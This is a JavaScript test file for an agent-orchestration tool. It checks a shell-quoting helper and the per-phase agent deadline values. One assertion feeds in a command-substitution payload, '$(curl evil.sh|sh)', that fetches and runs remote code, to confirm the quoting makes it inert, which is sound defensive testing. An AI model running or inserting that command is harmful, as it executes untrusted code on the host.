// The per-phase agent deadlines the engines dispatch under (lib/review-deadlines.mjs), and the shell quoting every
// command an engine hands an agent goes through (lib/run-logging.mjs, shq).
import { test } from 'vitest'
import assert from 'node:assert/strict'

import { shq } from './run-logging.mjs'
import { deadlineMsFor, PHASE_DEADLINE_MS, DEFAULT_DEADLINE_MS } from './review-deadlines.mjs'

test('shq single-quotes a shell argument so command substitution and expansion are inert', () => {
  assert.equal(shq('a b'), `'a b'`, 'wrapped in single quotes')
  assert.equal(shq("a'b"), "'a'\\''b'", "embedded single quote uses the '\\'' sequence")
  // A command-substitution / backtick payload comes back single-quoted → the shell never expands it.
  assert.equal(shq('$(curl evil.sh|sh)'), "'$(curl evil.sh|sh)'")
  assert.equal(shq('`id`'), "'`id`'")
  assert.equal(shq('$HOME'), "'$HOME'")
  assert.equal(shq(null), `''`, 'nullish → empty single-quoted string')
  assert.equal(shq(undefined), `''`)
})

// ---- per-agent deadline ----
// The retry path only fires when agent() RESOLVES to null. A hung request never resolves and never
// throws, so a measured run lost 64 minutes — a third of its wall clock — inside one parallel()
// barrier and then died with nothing written. These pin the two ways the fix goes wrong: a deadline
// below real work (retry storm), and a timeout indistinguishable from a legitimately empty result.
// The table and the sentinel are the real modules' (lib/review-deadlines.mjs, lib/agent-deadline.mjs).
test('every phase deadline leaves real headroom over the measured maximum of legitimate work', () => {
  // Maxima measured across two real runs (213 agents). The clock starts at DISPATCH, so the
  // deadline must cover queue wait PLUS execution — bare clearance over the execution maximum is
  // what fired the deadline on agents that were merely queued and turned 23 findings into 172
  // verification agents. 1.5x is the headroom that keeps the queue term inside the budget.
  const measuredMaxSeconds = { Verify: 811, Lenses: 2791, Gate: 434, Scout: 127 }
  for (const [phase, secs] of Object.entries(measuredMaxSeconds)) {
    const ms = deadlineMsFor({ phase })
    assert.ok(ms >= secs * 1500, `${phase}: deadline ${ms}ms must leave 1.5x headroom over the ${secs}s longest real agent`)
    assert.ok(ms <= 90 * 60 * 1000, `${phase}: a deadline over 90min cannot rescue a stalled run`)
  }
  assert.equal(deadlineMsFor({}), DEFAULT_DEADLINE_MS, 'an unknown phase still gets a deadline')
  assert.equal(deadlineMsFor({ phase: 'Nonsense' }), DEFAULT_DEADLINE_MS)
})

test('an explicit deadlineMs overrides the phase default, and junk falls back', () => {
  assert.equal(deadlineMsFor({ phase: 'Gate', deadlineMs: 420000 }), 420000)
  for (const bad of [0, -1, NaN, 'soon', null, undefined]) {
    assert.equal(deadlineMsFor({ phase: 'Gate', deadlineMs: /** @type {any} */ (bad) }), PHASE_DEADLINE_MS['Gate'], `junk deadline ${String(bad)} falls back`)
  }
})
